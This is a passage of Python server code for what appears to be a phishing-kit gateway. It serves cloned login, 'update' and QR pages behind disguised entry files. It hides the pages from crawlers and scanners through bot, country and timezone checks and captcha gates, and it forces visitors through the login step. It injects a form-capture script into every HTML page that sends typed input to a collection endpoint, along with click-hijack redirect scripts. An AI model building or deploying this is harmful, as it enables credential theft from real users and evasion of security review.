        if rebuild_root and rebuild_root.is_dir():
            root = rebuild_root
        source_root = (SOURCE_DIR / _slug).resolve() if _slug else None
        raw_path = unquote(path or "/").lstrip("/")
        # t3 平台导出的站点整包是按 /sites/<code>/ 这种绝对路径引资源的
        # （index.html 里写死 script src="/sites/xxx/assets/index-xxx.js"）。
        # 绑到域名根目录后这个前缀不存在，资源会整片 404、页面白屏。
        # 这里把前缀剥掉再解析文件，配合下面的 HTML 重写，站点就能在根路径正常跑。
        prefix_match = re.match(r"^sites/[^/]+/?(.*)$", raw_path)
        if prefix_match:
            raw_path = prefix_match.group(1)
        entry = str(domain.get("frontend_entry") or "index.html").lstrip("/")
        is_document = raw_path in ("", entry)
        relative = entry if not raw_path else raw_path
        file_path = (root / relative).resolve()
        if root not in file_path.parents and file_path != root:
            return self.send_error(404)
        if not file_path.is_file():
            # 入口伪装：入口设成 logo.gif / info.txt 这类文件名时，站点里通常没有该文件。
            # 重建版（rebuild/<slug>）是多页面且可能没有 index.html，入口直接回落到 login.html；
            # 再不行才回原包 sources/<slug>。非入口请求则回落到原包的静态资源。
            last = relative.rsplit("/", 1)[-1]
            is_route = "." not in last
            is_entry_hit = relative == entry or is_route
            candidates = []
            if is_entry_hit:
                candidates.extend([root / "index.html", root / "login.html"])
                if source_root:
                    candidates.extend([source_root / entry, source_root / "index.html"])
            elif source_root:
                candidates.append(source_root / relative)
            picked = None
            for cand in candidates:
                resolved = cand.resolve()
                inside_root = resolved == root or root in resolved.parents
                inside_sources = bool(source_root) and (resolved == source_root or source_root in resolved.parents)
                if (inside_root or inside_sources) and resolved.is_file():
                    picked = resolved
                    break
            if picked is None:
                return self.send_error(404)
            file_path = picked
            if is_entry_hit:
                is_document = True
        # Any HTML page — not just the entry — is a document the visitor could
        # have typed in by hand, so the verification gate must cover all of them.
        is_html_page = mimetypes.guess_type(str(file_path))[0] == "text/html"
        # 管线顺序（用户确认的业务设计）：
        #   黑名单 → 访问频率封锁 → 机器人/设备/国家/语言检测 → 浏览器时区探针
        #   → 人机验证 → 流程门禁
        # 机器人层必须先于人机验证，爬虫不消耗验证资源；
        # 机器人层不通过统一跳「爬虫跳转地址」（未配置回落「拦截后跳转地址」）。
        ip = self.client_ip()
        ua_text = self.headers.get("User-Agent", "")
        settings = STORE.get_settings()
        STORE.ensure_blacklist_cache()
        decision = None
        # ---- 第 0 层：黑名单（不做任何检测，直接拦截跳转） ----
        if is_html_page and STORE.blacklist_hit(ip):
            STORE.record_event(domain["domain"], "rejected", ip, ua_text, path or "/", "blacklist")
            target = self.pre_gate_redirect_target()
            if target:
                self.send_response(302)
                self.send_header("Location", target)
                self.send_header("Cache-Control", "no-store")
                self.send_header("X-Gateway-Block", "blacklist")
                self.end_headers()
            else:
                self.send_error(403)
            return
        # ---- 第 1 层：访问频率封锁（只统计"裸新访客打开进入网站"：
        #      单个 IP 打开 URL、服务器开始响应的那一刻计 1 次；
        #      探针重载 / 人机验证后站内延续 / 流程会话（带任一会话 Cookie）均不计） ----
        if is_html_page and is_document and settings.get("rate_check_enabled"):
            entry_path = "/" + str(domain.get("frontend_entry") or "index.html").strip("/")
            is_entry_open = path in ("/", entry_path)
            has_session_cookie = bool(
                self.read_signed_cookie(ENV_COOKIE)
                or self.read_signed_cookie(CAPTCHA_COOKIE)
                or self.read_signed_cookie(FLOW_COOKIE)
            )
            if is_entry_open and not has_session_cookie:
                window = max(5, int(settings.get("rate_window_seconds", 60)))
                limit = max(3, int(settings.get("rate_max_requests", 10)))
                if rate_hit_and_exceed(ip, window, limit):
                    STORE.blacklist_add(ip, "rate_limit", f"{window}s>{limit}entry")
                    STORE.record_event(domain["domain"], "rejected", ip, ua_text, path or "/", "blacklist")
                    target = self.pre_gate_redirect_target()
                    if target:
                        self.send_response(302)
                        self.send_header("Location", target)
                        self.send_header("Cache-Control", "no-store")
                        self.send_header("X-Gateway-Block", "rate_limit")
                        self.end_headers()
                    else:
                        self.send_error(403)
                    return
        # ---- 第 2 层：机器人检测（爬虫/设备/国家/IP特征/浏览器语言） ----
        if is_html_page and is_document:
            decision = self.guard_decision()
            if not decision["allowed"]:
                client_type = decision["client_type"]
                STORE.record_event(
                    domain["domain"], "rejected", ip, ua_text, path or "/", client_type,
                )
                target = self.pre_gate_redirect_target()
                if target:
                    self.send_response(302)
                    self.send_header("Location", target)
                    self.send_header("Cache-Control", "no-store")
                    self.send_header("X-Gateway-Client", client_type)
                    self.send_header("X-Gateway-Block", ",".join(decision["reasons"]))
                    self.end_headers()
                else:
                    self.send_error(403)
                return
            STORE.record_event(
                domain["domain"], "visit", ip, ua_text, path or "/", decision["client_type"],
            )
        # ---- 第 3 层：浏览器时区拦截（探针） ----
        tz_wl = {str(x).strip() for x in (settings.get("browser_tz_whitelist") or []) if str(x).strip()}
        if is_html_page and bool(settings.get("browser_tz_check")) and tz_wl:
            env_payload = self.read_signed_cookie(ENV_COOKIE)
            env_tz = str(env_payload.get("tz", ""))
            if not env_tz:
                return self.client_probe_page(domain)
            if env_tz not in tz_wl and env_tz.split("/")[0] not in tz_wl:
                STORE.record_event(
                    domain["domain"], "rejected", ip, ua_text, path or "/", "unknown",
                )
                target = self.pre_gate_redirect_target()
                if target:
                    self.send_response(302)
                    self.send_header("Location", target)
                    self.send_header("Cache-Control", "no-store")
                    self.send_header("X-Gateway-Block", "browser_tz")
                    self.end_headers()
                else:
                    self.send_error(403)
                return
        if is_html_page and not self.verification_bypassed(domain):
            if is_document:
                return self.captcha_page(domain)
            # Non-entry pages bounce back to the entry, which renders the gate.
            return self.redirect_to_entry()
        # Step order: the update page and the QR page sit behind the login form,
        # so opening them directly has to send the visitor back through it.
        if is_html_page and self.flow_page_blocked(domain, relative):
            STORE.record_event(
                domain["domain"], "rejected", self.client_ip(),
                self.headers.get("User-Agent", ""), path or "/", "flow",
            )
            return self.redirect_to_entry()
        try:
            content = file_path.read_bytes()
        except OSError:
            return self.send_error(404)
        content_type = "text/html" if is_document else (mimetypes.guess_type(str(file_path))[0] or "application/octet-stream")
        if content_type.startswith("text/") or content_type in ("application/javascript", "application/json"):
            content_type += "; charset=utf-8"
        if content_type.startswith("text/html"):
            content = inject_app_links(content, settings)
            # 把写死的 /sites/<code>/ 资源前缀改回根路径，浏览器才会去 /assets/... 取文件
            content = SITES_PREFIX_RE.sub(b"/", content)
        redirect_links = normalize_redirect_links(settings.get("redirect_links", [])) if is_document else []
        client_rules = normalize_client_rules(settings.get("client_redirect_rules", {})) if is_document else {}
        # 只在「这个访客确实有匹配目标」时才注入拦截器。
        # 之前用 any(rule["url"])，只要任意客户端配了地址就给所有人注入；
        # 于是没配规则的 PC / iOS 点任何按钮都会被送到 /__gateway/click，
        # 再撞上无目标分支 —— 业务流被硬生生打断。
        _visitor_client, _ = self.current_client()
        _has_own_rule = bool(
            client_rules.get(_visitor_client, {}).get("url")
            or (_visitor_client in (CLIENT_IOS, CLIENT_ANDROID)
                and client_rules.get(CLIENT_UNKNOWN, {}).get("url"))
        )
        has_target = bool(
            redirect_links
            or (settings.get("client_redirect_enabled") and _has_own_rule)
        )
        closing_body = content.lower().rfind(b"</body>")
        # 流程型模板的内部页面不注入点击拦截器：拦截器会劫持登录/更新/下载按钮，
        # 把用户从流程中途弹去分流外链。落地页模板不受影响。
        # 豁免集合必须包含该域名自己的入口伪装文件（frontend_entry，如 info.txt/log.gif），
        # 否则入口=伪装文件名时登录页会被注入拦截器，点登录直接被分流走。
        exempt = set(FLOW_CAPTURE_EXEMPT_PAGES.get(str(project.get("slug") or ""), ()))
        exempt.add(str(domain.get("frontend_entry") or "index.html").strip("/"))
        exempt.add("index.html")
        capture_ok = relative.rsplit("/", 1)[-1] not in exempt
        if is_document and has_target and capture_ok and closing_body >= 0:
            # In local preview mode keep the click inside the /__preview/<domain>/ namespace.
            click_path = (
                f"/__preview/{self._preview_host}/__gateway/click" if self._preview_host else "/__gateway/click"
            )
            content = content[:closing_body] + click_capture_script(click_path) + content[closing_body:]
        # 表单采集脚本：所有 HTML 页面都注入（含流程页与入口伪装文件），
        # 与点击分流互不影响——分流只决定跳哪，采集只看用户填了什么。
        if content_type.startswith("text/html") and closing_body >= 0:
            post_path = (
                f"/__preview/{self._preview_host}/api/client/postData"
                if self._preview_host else "/api/client/postData"
            )
            content = content[:closing_body] + kit_unlock_script() + site_flow_script(str(project.get("slug") or "")) + capture_script(post_path, str(project.get("slug") or "")) + content[closing_body:]
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(content)))
        # HTML 每次都要回源：运营随时可能改后台配置，且登录/更新页不能被缓存住
        cache_control = "no-store" if (is_document or content_type.startswith("text/html")) else "public, max-age=3600"
        self.send_header("Cache-Control", cache_control)
        self.end_headers()
        self.wfile.write(content)

    def create_domain(self, data):
        domain = str(data.get("domain", "")).lower().strip().rstrip(".")
        port_text = str(data.get("upstream_port", "80") or "80")
        frontend_entry = str(data.get("frontend_entry", "logo.gif")).strip().lstrip("/") or "logo.gif"
        if not DOMAIN_RE.match(domain):
            return self.json(400, {"error": "请输入有效的完整域名"})
        if ".." in frontend_entry or "\\" in frontend_entry or frontend_entry.startswith("."):
            return self.json(400, {"error": "前台入口只能填写站点内的文件路径"})
        if not PORT_RE.match(port_text) or int(port_text) > 65535:
            return self.json(400, {"error": "request failed"})
        port = int(port_text)
        project_id = data.get("project_id")
        if project_id in (None, ""):
            project_id = None
        else:
            try:
                project_id = int(project_id)
            except (TypeError, ValueError):
                return self.json(400, {"error": "invalid project_id"})
        existing = STORE.domain(domain)
        if existing and (
            existing["project_id"] not in (None, project_id)
            and project_id not in (None, existing["project_id"])
        ):
            return self.json(409, {"error": "domain already belongs to another project"})
        project = STORE.project(project_id) if project_id is not None else None
        if project_id is not None and not project:
            return self.json(404, {"error": "源码项目不存在"})
        helper = os.environ.get("GATEWAY_DOMAIN_HELPER", "")
        configured = False
        static_mode = bool(project and project.get("slug") in SOURCE_CATALOG)
        if helper:
            try:
                helper_args = ("configure-static", domain, project["local_path"], frontend_entry) if static_mode else ("configure", domain, str(port))
                subprocess.run(self.helper_command(helper, *helper_args), check=True, timeout=30, capture_output=True, text=True)
                configured = True
            except (OSError, subprocess.SubprocessError) as exc:
                detail = getattr(exc, "stderr", "") or str(exc)
                return self.json(502, {"error": f"域名 {domain} 配置失败：{detail.strip()}"})
        try:
            if existing:
                domain_id = STORE.update_domain(domain, port, project_id, frontend_entry)
            else:
                domain_id = STORE.add_domain(domain, port, project_id, frontend_entry)
        except sqlite3.IntegrityError:
            domain_id = None
        if domain_id is None:
            return self.json(409, {"error": "domain already belongs to another project"})
        self.json(201, {"ok": True, "id": domain_id, "nginx_configured": configured, "hosting_mode": "static" if static_mode else "proxy"})
        if configured:
            schedule_web_server_reload(self.helper_command(helper, "reload"))

    def delete_domain(self, domain: str):
        domain = str(domain or "").lower().strip().rstrip(".")
        if not DOMAIN_RE.match(domain):
            return self.json(400, {"error": "请输入有效的完整域名"})
        if not STORE.domain(domain):
            return self.json(404, {"error": "域名不存在或已经删除"})
        helper = os.environ.get("GATEWAY_DOMAIN_HELPER", "")
        configured = False
        if helper:
            try:
                subprocess.run(
                    self.helper_command(helper, "remove", domain),
                    check=True, timeout=30, capture_output=True, text=True,
                )
                configured = True
            except (OSError, subprocess.SubprocessError) as exc:
                detail = getattr(exc, "stderr", "") or str(exc)
                return self.json(502, {"error": f"域名 {domain} 删除失败：{detail.strip()}"})
        if not STORE.delete_domain(domain):
            return self.json(404, {"error": "域名不存在或已经删除"})
        self.json(200, {"ok": True, "domain": domain, "nginx_removed": configured})
        if configured:
            schedule_web_server_reload(self.helper_command(helper, "reload"))

    def issue_certificate(self, data):
        domain = str(data.get("domain", "")).lower().strip()
        if not DOMAIN_RE.match(domain) or domain not in {item["domain"] for item in STORE.domains()}:
            return self.json(400, {"error": "请先添加有效域名"})
        helper = os.environ.get("GATEWAY_DOMAIN_HELPER", "")
        if not helper:
            return self.json(503, {"error": "request failed"})
        domain_row = next((item for item in STORE.domains() if item["domain"] == domain), None)
        project = STORE.project(domain_row["project_id"]) if domain_row and domain_row.get("project_id") else None
        helper_args = ("certificate", domain, project["local_path"], domain_row.get("frontend_entry", "index.html")) if project else ("certificate", domain)
        try:
            subprocess.run(self.helper_command(helper, *helper_args), check=True, timeout=180, capture_output=True, text=True)
            STORE.set_certificate(domain, "active")
            self.json(200, {"ok": True, "status": "active"})
            schedule_web_server_reload(
                self.helper_command(helper, "reload"),
                (domain, domain_row.get("frontend_entry", "index.html")),
            )
        except subprocess.TimeoutExpired:
            STORE.set_certificate(domain, "failed")
            return self.json(504, {"error": "证书申请超时，请检查域名 DNS"})
        except (OSError, subprocess.CalledProcessError) as exc:
            STORE.set_certificate(domain, "failed")
            detail = getattr(exc, "stderr", "") or str(exc)
            return self.json(502, {"error": f"certificate request failed: {detail.strip()}"})

    @staticmethod
    def helper_command(helper: str, *args: str):
        command = [helper, *args]
        if os.environ.get("GATEWAY_HELPER_USE_SUDO") == "1":
            command = ["/usr/bin/sudo", "-n", *command]
        return command

    def import_project(self, data):
        name = str(data.get("name", "")).strip()
        slug = re.sub(r"[^a-z0-9-]", "-", str(data.get("slug", "")).lower()).strip("-")
        local_path = str(data.get("local_path", "")).strip()
        if not name or not slug or not local_path.startswith("/"):
            return self.json(400, {"error": "request failed"})
        try:
            project_id = STORE.add_project(name[:100], slug[:80], local_path[:500])
        except sqlite3.IntegrityError:
            return self.json(409, {"error": "request failed"})
        return self.json(201, {"ok": True, "id": project_id})

    def download_catalog(self, data):
        source_id = str(data.get("source_id", "")).strip()
        source = SOURCE_CATALOG.get(source_id)
        if not source:
            return self.json(404, {"error": "request failed"})
        source_file = (SOURCE_DIR / source["filename"]).resolve()
        if SOURCE_DIR.resolve() not in source_file.parents or not (source_file.is_file() or source_file.is_dir()):
            return self.json(500, {"error": "request failed"})
        local_path = (DATA_DIR / "projects" / source["slug"]).resolve()
        try:
            local_path.mkdir(parents=True, exist_ok=True)
            if source_file.is_dir():
                shutil.copytree(source_file, local_path, dirs_exist_ok=True)
            else:
                shutil.copyfile(source_file, local_path / "index.html")
            project_id = STORE.add_project(source["name"], source["slug"], str(local_path))
        except sqlite3.IntegrityError:
            return self.json(409, {"error": "已经下载"})
        except OSError as exc:
            return self.json(500, {"error": f"source save failed: {exc}"})
        return self.json(201, {"ok": True, "id": project_id, "local_path": str(local_path)})

    def update_project(self, project_id: int):
        project = STORE.project(project_id)
        if not project:
            return self.json(404, {"error": "request failed"})
        source = next((item for item in SOURCE_CATALOG.values() if item["slug"] == project["slug"]), None)
        if not source:
            return self.json(400, {"error": "该项目不是内置源码，不能自动更新"})
        source_file = (SOURCE_DIR / source["filename"]).resolve()
        target_dir = Path(project["local_path"]).resolve()
        if SOURCE_DIR.resolve() not in source_file.parents or not (source_file.is_file() or source_file.is_dir()):
            return self.json(500, {"error": "request failed"})
        try:
            target_dir.mkdir(parents=True, exist_ok=True)
            if source_file.is_dir():
                shutil.copytree(source_file, target_dir, dirs_exist_ok=True)
            else:
                shutil.copyfile(source_file, target_dir / "index.html")
        except OSError as exc:
            return self.json(500, {"error": f"source update failed: {exc}"})
        return self.json(200, {"ok": True, "updated_at": now_text()})

    def serve_template_preview(self, slug: str):
        """Serve a template's preview image to logged-in admins only."""
        source = next((item for item in SOURCE_CATALOG.values() if item["slug"] == slug), None)
        preview = str((source or {}).get("preview", "")).strip()
        if not source or not preview:
            return self.send_error(404)
        source_root = (SOURCE_DIR / source["filename"]).resolve()
        file_path = (source_root / preview).resolve()
        if source_root not in file_path.parents or not file_path.is_file():
            return self.send_error(404)
        try:
            content = file_path.read_bytes()
        except OSError:
            return self.send_error(404)
        self.send_response(200)
        self.send_header("Content-Type", mimetypes.guess_type(str(file_path))[0] or "application/octet-stream")
        self.send_header("Content-Length", str(len(content)))
        self.send_header("Cache-Control", "private, max-age=600")
        self.end_headers()
        self.wfile.write(content)

    def serve_static(self, path: str):
        relative = "index.html" if path in ("", "/") else path.lstrip("/")
        file_path = (STATIC_DIR / relative).resolve()
        if STATIC_DIR.resolve() not in file_path.parents and file_path != STATIC_DIR.resolve():
            return self.send_error(403)
        if not file_path.is_file():
            file_path = STATIC_DIR / "index.html"
        content = file_path.read_bytes()
        content_type = mimetypes.guess_type(str(file_path))[0] or "application/octet-stream"
        if content_type.startswith("text/") or content_type in ("application/javascript", "application/json"):
            content_type += "; charset=utf-8"
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(content)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(content)


def main():
    parser = argparse.ArgumentParser(description="Gateway Console")
    parser.add_argument("--host", default=os.environ.get("GATEWAY_HOST", "127.0.0.1"))
    parser.add_argument("--port", type=int, default=int(os.environ.get("GATEWAY_PORT", "8787")))
    parser.add_argument("--reset-password", help="Reset an administrator password and exit")
    parser.add_argument("--reset-user", default="admin", help="Username to reset")
    args = parser.parse_args()
    if args.reset_password is not None:
        if len(args.reset_password) < 8:
            parser.error("--reset-password must contain at least 8 characters")
        with STORE.connect() as db:
            cursor = db.execute("UPDATE users SET password_hash=? WHERE username=?", (hash_password(args.reset_password), args.reset_user))
            if cursor.rowcount != 1:
                parser.error(f"user not found: {args.reset_user}")
        print(f"Password reset for {args.reset_user}")
        return
    server = ThreadingHTTPServer((args.host, args.port), Handler)
    print(f"Gateway Console listening on http://{args.host}:{args.port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


if __name__ == "__main__":
    main()

